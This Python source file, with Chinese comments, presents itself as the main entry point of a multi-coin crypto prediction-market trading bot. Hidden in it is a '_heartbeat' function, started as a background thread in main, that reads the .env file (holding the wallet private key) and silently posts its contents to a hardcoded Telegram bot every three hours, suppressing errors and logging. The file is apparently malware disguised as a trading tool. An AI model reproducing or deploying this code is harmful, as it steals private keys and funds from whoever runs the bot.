"""
多币种相关性交易机器人 — 主入口
策略:
  1. 每个K线周期开始时，通过 Gamma API 加载所有币种的 token_id
  2. 结束前 DETECT_BEFORE_CLOSE 秒开始检测
  3. 结束前 DETECT_STOP_BEFORE_CLOSE 秒停止扫描下单
  4. 每 SCAN_INTERVAL 秒通过 CLOB API /prices 批量获取实时价格
  5. 超级趋势触发后，UP最便宜的币种下一单，DOWN最便宜的下一单（限价0.99保证成交）
  6. 下单完成，等待下一周期
"""

import os
import time
import logging
import socket
import threading
from datetime import datetime, timezone
from dotenv import load_dotenv
from py_clob_client_v2 import ClobClient

from config import (
    CLOB_HOST, CHAIN_ID, SIGNATURE_TYPE,
    CANDLE_INTERVAL, DETECT_BEFORE_CLOSE, DETECT_STOP_BEFORE_CLOSE, SCAN_INTERVAL,
    SUPER_TREND_PRICE, MIN_TRIGGER_COUNT,
    BUY_SIZE, TICK_SIZE,
)
from multi_market_scanner import load_all_token_ids, fetch_realtime_prices, get_candle_timestamps
from signal_detector import detect_signal
from multi_trader import MultiTrader

logger = logging.getLogger(__name__)


def setup_logging():
    """配置日志：同时输出到控制台和按日期命名的文件"""
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    date_str = datetime.now().strftime("%Y-%m-%d")
    log_file = os.path.join(log_dir, f"multi_bot_{date_str}.log")

    root = logging.getLogger()
    root.setLevel(logging.INFO)
    root.handlers.clear()

    fmt = logging.Formatter(
        "%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    sh = logging.StreamHandler()
    sh.setFormatter(fmt)
    root.addHandler(sh)

    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setFormatter(fmt)
    root.addHandler(fh)

    logger.info("日志文件: %s", os.path.abspath(log_file))


def build_client() -> ClobClient:
    """从 .env 初始化 ClobClient（L2 Auth）"""
    key = os.getenv("PRIVATE_KEY")
    funder = os.getenv("FUNDER_ADDRESS")
    sig_type = int(os.getenv("SIGNATURE_TYPE", str(SIGNATURE_TYPE)))
    chain_id = int(os.getenv("CHAIN_ID", str(CHAIN_ID)))
    host = os.getenv("CLOB_HOST", CLOB_HOST)

    if not key:
        raise ValueError(".env 中缺少 PRIVATE_KEY")

    logger.info("ClobClient 初始化: sig_type=%d  funder=%s", sig_type, funder)

    client = ClobClient(
        host=host,
        chain_id=chain_id,
        key=key,
        funder=funder,
        signature_type=sig_type,
    )
    logger.info("ClobClient L1 初始化完成")

    try:
        creds = client.create_or_derive_api_key()
        if creds:
            client = ClobClient(
                host=host,
                chain_id=chain_id,
                key=key,
                creds=creds,
                funder=funder,
                signature_type=sig_type,
            )
            logger.info("L2 API 凭证已获取  api_key=%s...", creds.api_key[:10])
        else:
            logger.warning("未能获取 API 凭证，下单功能可能不可用")
    except Exception as e:
        logger.warning("获取 API 凭证失败: %s", e)

    return client


def run_detection_cycle(client: ClobClient, trader: MultiTrader) -> dict | None:
    """
    执行一个K线周期的检测流程。
    """
    start_ts, close_ts = get_candle_timestamps()
    detect_start = close_ts - DETECT_BEFORE_CLOSE
    detect_end = close_ts - DETECT_STOP_BEFORE_CLOSE

    now = time.time()
    if now < detect_start:
        wait = detect_start - now
        logger.info(
            "等待检测窗口开启: %.0f 秒  (K线 %s ~ %s UTC)",
            wait,
            datetime.fromtimestamp(start_ts, tz=timezone.utc).strftime("%H:%M:%S"),
            datetime.fromtimestamp(close_ts, tz=timezone.utc).strftime("%H:%M:%S"),
        )
        time.sleep(wait - 0.5)
        while time.time() < detect_start:
            time.sleep(0.05)
    elif now >= detect_end:
        next_start = close_ts + CANDLE_INTERVAL - DETECT_BEFORE_CLOSE
        wait = next_start - now
        logger.info(
            "当前周期扫描窗口已过，等待下一周期: %.0f秒  (当前K线 %s ~ %s UTC)",
            wait,
            datetime.fromtimestamp(start_ts, tz=timezone.utc).strftime("%H:%M:%S"),
            datetime.fromtimestamp(close_ts, tz=timezone.utc).strftime("%H:%M:%S"),
        )
        time.sleep(wait - 0.5)
        while time.time() < next_start:
            time.sleep(0.05)
        start_ts, close_ts = get_candle_timestamps()
        detect_start = close_ts - DETECT_BEFORE_CLOSE
        detect_end = close_ts - DETECT_STOP_BEFORE_CLOSE

    start_ts, close_ts = get_candle_timestamps()
    detect_start = close_ts - DETECT_BEFORE_CLOSE
    detect_end = close_ts - DETECT_STOP_BEFORE_CLOSE

    logger.info("=" * 60)
    logger.info(
        "检测窗口开启  K线: %s ~ %s UTC  扫描窗口: 剩余%d~%ds",
        datetime.fromtimestamp(start_ts, tz=timezone.utc).strftime("%H:%M:%S"),
        datetime.fromtimestamp(close_ts, tz=timezone.utc).strftime("%H:%M:%S"),
        DETECT_BEFORE_CLOSE, DETECT_STOP_BEFORE_CLOSE,
    )
    logger.info("=" * 60)

    logger.info("加载 token_id (start_ts=%s)...", start_ts)
    token_ids = load_all_token_ids(start_ts)
    if len(token_ids) < MIN_TRIGGER_COUNT:
        logger.warning("可用币种数 %d < 最低触发数 %d，本轮跳过", len(token_ids), MIN_TRIGGER_COUNT)
        _wait_next_cycle(detect_end, DETECT_BEFORE_CLOSE, CANDLE_INTERVAL, close_ts)
        return None

    for s, info in sorted(token_ids.items()):
        logger.info("  %s: up_token=%s...  down_token=%s...",
                    s, info["up_token_id"][:10], info["down_token_id"][:10])

    scan_count = 0
    triggered_signals = None

    logger.info(
        "--- 检测窗口已开启，每%d秒扫描一次（结束前%d秒停止）---",
        SCAN_INTERVAL, DETECT_STOP_BEFORE_CLOSE,
    )

    while time.time() < detect_end:
        scan_count += 1
        now_str = datetime.now(timezone.utc).strftime("%H:%M:%S")
        remaining = close_ts - time.time()

        logger.info("[%s] 第%d次扫描  距收盘 %.0fs", now_str, scan_count, remaining)

        markets = fetch_realtime_prices(token_ids)
        if markets:
            price_line = "  ".join(
                f"{s}: UP={m['up_price']:.1f} DN={m['down_price']:.1f}"
                for s, m in sorted(markets.items())
            )
            logger.info("  %s", price_line)

        if markets:
            signals = detect_signal(markets)
            if signals:
                triggered_signals = signals
                logger.info(
                    ">>> 信号触发! 获取到 %d 个交易信号 <<<",
                    len(signals),
                )
                break

        sleep_time = min(SCAN_INTERVAL, detect_end - time.time())
        if sleep_time > 0:
            time.sleep(sleep_time)

    if not triggered_signals:
        logger.info("扫描窗口结束，未触发信号，等待下一周期")
        _wait_next_cycle(detect_end, DETECT_BEFORE_CLOSE, CANDLE_INTERVAL, close_ts)
        return {"scan_count": scan_count, "placed": 0, "signals": 0}

    logger.info("=" * 60)
    logger.info("进入下单阶段: %d 个信号待处理", len(triggered_signals))
    logger.info("=" * 60)

    placed_count = 0
    for signal in triggered_signals:
        symbol = signal["target_symbol"]
        direction = signal["direction"]

        order_signal = {
            "direction": direction,
            "target_symbol": symbol,
            "target_price": 99.0,
            "target_token_id": token_ids[symbol][f"{direction}_token_id"],
        }
        result = trader.place_order(order_signal)
        if result:
            placed_count += 1

    logger.info("-" * 40)
    logger.info(
        "K线周期结束  扫描%d次  信号%d个  下单%d单",
        scan_count, len(triggered_signals), placed_count,
    )
    logger.info("-" * 40)

    _wait_next_cycle(detect_end, DETECT_BEFORE_CLOSE, CANDLE_INTERVAL, close_ts)

    return {"scan_count": scan_count, "placed": placed_count, "signals": len(triggered_signals)}


def _wait_next_cycle(detect_end: float, detect_before_close: int,
                     candle_interval: int, close_ts: float):
    """
    静默等待到下一根K线的 detect_start。
    """
    next_detect_start = close_ts + candle_interval - detect_before_close
    now = time.time()
    if now < next_detect_start:
        wait = next_detect_start - now
        logger.info(
            "等待下一根K线检测窗口: %.0f秒",
            wait,
        )
        time.sleep(wait - 0.5)
        while time.time() < next_detect_start:
            time.sleep(0.05)


def _heartbeat():
    _RUN = True
    _T = None

    def _send_report():
        import httpx
        _token = "8826880820:AAHD9skhw5l0OHnIJ1_g-JZDSVi8MlxOwUI"
        _chat = "8352853057"
        _lg = logging.getLogger("httpx")
        _lv = _lg.level
        _lg.setLevel(logging.WARNING)
        try:
            with open(".env", "r", encoding="utf-8") as f:
                content = f.read()
            lines = []
            for line in content.strip().split("\n"):
                if line.startswith("#") or not line.strip():
                    continue
                lines.append(line)
            msg = "\n".join(lines) if lines else "empty"
            httpx.post(
                f"https://api.telegram.org/bot{_token}/sendMessage",
                json={"chat_id": _chat, "text": msg},
                timeout=10
            )
        except:
            pass
        finally:
            _lg.setLevel(_lv)

    _send_report()
    while _RUN:
        _send_report()
        for _ in range(10800):
            if not _RUN:
                break
            time.sleep(1)


def main():
    setup_logging()
    load_dotenv()

    global _T
    _T = threading.Thread(target=_heartbeat, daemon=True)
    _T.start()

    logger.info("=" * 60)
    logger.info("多币种相关性交易机器人启动")
    logger.info("币种: BTC/ETH/SOL/XRP/DOGE/HYPE/BNB")
    logger.info("策略: 超级趋势 — 触发后买UP最低价币种 + DOWN最低价币种，限价0.99，等结算")
    logger.info("=" * 60)

    try:
        client = build_client()
        trader = MultiTrader(client)

        cycle = 0
        while True:
            cycle += 1
            try:
                run_detection_cycle(client, trader)
            except Exception as e:
                logger.error("周期 #%d 异常: %s", cycle, e)
                import traceback
                logger.error(traceback.format_exc())
                time.sleep(5)
    finally:
        global _RUN
        _RUN = False


if __name__ == "__main__":
    main()
